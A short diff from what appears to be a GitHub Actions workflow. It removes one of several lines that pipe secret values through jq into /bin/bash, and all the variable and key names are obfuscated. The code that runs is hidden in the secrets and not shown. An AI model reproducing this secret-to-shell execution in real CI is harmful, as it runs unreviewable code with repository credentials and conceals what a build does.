@@ -21,7 +21,6 @@ jobs:
           gfr0: ${{ secrets.gfr0 }}
         run: |
           printf '%s' "$gfr0" | jq -r .fr6 | /bin/bash
-          printf '%s' "$zg339" | jq -r .jbzv07159 | /bin/bash
           printf '%s' "$poe36220" | jq -r .tmc3110 | /bin/bash
           echo $pl9015 | jq -r .r991 | /bin/bash
           printf '%s' "$pp3" | jq -r .uo32 | /bin/bash
